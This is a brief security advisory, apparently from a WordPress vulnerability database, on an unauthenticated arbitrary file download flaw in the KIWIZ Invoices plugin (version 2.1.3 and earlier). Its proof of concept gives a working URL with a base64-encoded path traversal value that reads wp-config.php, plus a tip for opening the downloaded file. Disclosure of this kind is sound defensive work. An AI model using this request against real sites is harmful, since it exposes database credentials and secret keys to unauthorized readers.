## WordPress Plugin Vulnerabilities

# KIWIZ Invoices Certification & PDF System <= 2.1.3 - Unauthenticated Arbitrary File Download

### Description

The plugin does not validate the path of files to be downloaded, which could allow unauthenticated attacker to read/downlaod arbitrary files, as well as perform PHAR unserialization (assuming they can upload a file on the server)

### Proof of Concept

To download ../../../../wp-config.php:
https://example.com/wp-content/plugins/woocommerce-gateway-certification-de-facture-et-gestion-de-pdf-kiwiz/entrypoint/concat-pdf.php?file\_name=Li4vLi4vLi4vLi4vd3AtY29uZmlnLnBocA==
The downloaded file will have the pdf extension, just change it to php
